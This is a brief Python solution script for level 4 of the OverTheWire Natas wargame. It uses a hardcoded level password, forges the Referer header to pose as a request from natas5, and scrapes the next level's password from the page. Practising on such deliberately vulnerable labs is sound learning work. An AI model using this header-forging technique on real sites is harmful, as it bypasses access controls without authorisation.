#!/usr/bin/env python3
import requests 
import re

username = "natas4"
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

s = requests.session()


url = 'http://%s.natas.labs.overthewire.org' % username


r = s.get(url, auth = (username, password), headers= {"Referer" : "http://natas5.natas.labs.overthewire.org/"})
content = r.text
# print(content)
print(re.findall('The password for natas5 is (.*)',content)[0])